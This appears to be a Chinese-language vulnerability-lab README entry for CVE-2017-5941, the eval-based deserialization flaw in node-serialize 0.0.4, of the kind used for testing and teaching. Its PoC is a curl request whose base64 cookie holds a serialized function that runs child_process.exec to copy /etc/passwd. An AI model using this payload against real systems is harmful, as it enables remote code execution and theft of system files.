### CVE-2017-5941 - node-serialize 0.0.4 unserialize eval() 漏洞

测试镜像

* src/node-serialize/0.0.4/

说明

* node-unserialize 使用 eval 去生成 `function()`，当用户传递闭包函数可造成 RCE

参考文章

* [Node.js 模块 node-serialize 反序列化任意代码执行漏洞](https://www.seebug.org/vuldb/ssvid-92674)

Poc

```
curl 127.0.0.1 -H "Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjcCAvZXRjL3Bhc3N3ZCAvdG1wJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7XG4gICAgXHQvLyByZXMg5a+56LGh6KKr6ZqU56a75LqG77yM6ZyA6KaB5YaN56CU56m25LiL77yM5omA5Lul5peg5rOV55u05o6l5Zue5pi+XG4gICAgXHQvLyByZXMuc2VuZChcInN0ZG91dD1cIiwgc3Rkb3V0KVxuICAgIFx0Ly8gcmVzLnNlbmQoXCJzdGRlcnI9XCIsIHN0ZGVycilcbiAgICB9KVxuICB9KCkifQ%3D="
```
